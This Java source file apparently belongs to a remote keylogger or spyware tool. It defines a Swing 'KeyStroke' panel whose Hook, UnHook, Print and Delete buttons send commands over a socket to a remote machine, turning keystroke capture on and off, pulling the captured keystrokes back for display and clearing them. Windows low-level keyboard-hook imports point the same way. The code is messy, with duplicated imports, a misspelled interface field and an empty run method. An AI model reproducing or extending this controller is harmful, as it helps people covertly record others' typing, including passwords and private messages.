import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.NativeInputEvent;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.Socket;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;
import org.xerial.snappy.Snappy;

import javax.swing.*;
import javax.swing.plaf.basic.BasicInternalFrameTitlePane.SystemMenuBar;

import java.lang.ProcessBuilder;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.awt.image.Raster;
import java.io.*;
import java.net.Socket;
import java.util.Vector;

class KeyStroke extends JPanel implements Runnable {
    private String myFont = "ClearGothic";
    private Socket socket;
	private JFrame frame;
	private DataInputStream dataInputStream;
    private DataOutputStream dataOutputStream;
    private JButton Hook;
    private JButton Unhook;
    private JButton Print;
    private JButton Delete;

	private ObjectInputStream objectInputStream;
    KeyStroke ppp=this;
	HHOOK hhk = null;
	HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
	Thread thread;
	Object lock = new Object();
    String key = "";
    private final JTextArea text = new JTextArea(10, 30);
    

    public interface User32jna extends Library {
        KeyStroke.User32jna INSTANCE = null;
        User32jna INSTACE = (User32jna) Native.loadLibrary("user32.dll", User32jna.class);
    }

	public KeyStroke(JFrame frame, Socket socket) {
		setLayout(null);
		this.socket = socket;
		this.frame = frame;
        
        text.setBounds(25, 80, 670, 500);
        text.setCaretPosition(0);
        text.setLineWrap(true);
        text.setEditable(false);
        

        Hook = new JButton("Hook");
        Hook.addActionListener(this::actionPerformed);
        Hook.setFocusable(false);
        Hook.setBounds(25,20,150,50);

        Unhook = new JButton("UnHook");
        Unhook.addActionListener(this::actionPerformed);
        Unhook.setFocusable(false);
        Unhook.setBounds(200,20,150,50);

        Print = new JButton("Print");
        Print.addActionListener(this::actionPerformed);
        Print.setFocusable(false);
        Print.setBounds(370,20,150,50);

        Delete = new JButton("Delete");
        Delete.addActionListener(this::actionPerformed);
        Delete.setFocusable(false);
        Delete.setBounds(550,20,150,50);

        try {
            dataOutputStream = new DataOutputStream(socket.getOutputStream());
        }
        catch (Exception e) {
            DebugMessage.printDebugMessage(e);
        }
        add(Hook);
        add(Unhook);
        add(Print);
        add(Delete);
        add(text);
		thread = new Thread(this);
		thread.start();
	}
    public void actionPerformed(ActionEvent e){
        
        if (e.getSource() == Hook) {
            try {
                Hook.setEnabled(false);
                Unhook.setEnabled(true);
                Print.setEnabled(true);
                Delete.setEnabled(true);
                dataOutputStream.writeUTF("H");
            }catch (Exception k){
                DebugMessage.printDebugMessage(k);
            }
        }
        else if (e.getSource() == Unhook) {
            try {
                Hook.setEnabled(true);
                Unhook.setEnabled(false);
                Print.setEnabled(true);
                Delete.setEnabled(true);
                dataOutputStream.writeUTF("UH");
            }catch (Exception k){
                DebugMessage.printDebugMessage(k);
            }
        }
        else if (e.getSource() == Print){
            try {
                Hook.setEnabled(true);
                Unhook.setEnabled(true);
                Print.setEnabled(false);
                Delete.setEnabled(true);
                dataInputStream = new DataInputStream(socket.getInputStream());
                dataOutputStream.writeUTF("P");
                String s = dataInputStream.readUTF();
                text.append(s);
            }catch (Exception k){
                DebugMessage.printDebugMessage(k);
            }
        }
        else if (e.getSource() == Delete){
            try {
                Hook.setEnabled(true);
                Unhook.setEnabled(true);
                Print.setEnabled(true);
                Delete.setEnabled(false);
                dataOutputStream.writeUTF("D");
                try {
                  text.setText("");
                } catch (Exception k) {
                    DebugMessage.printDebugMessage(k);
                }
            }catch (Exception k){   
                DebugMessage.printDebugMessage(k);
            }
        }

    }

  

    
    @Override
    public void run() {
    }
}
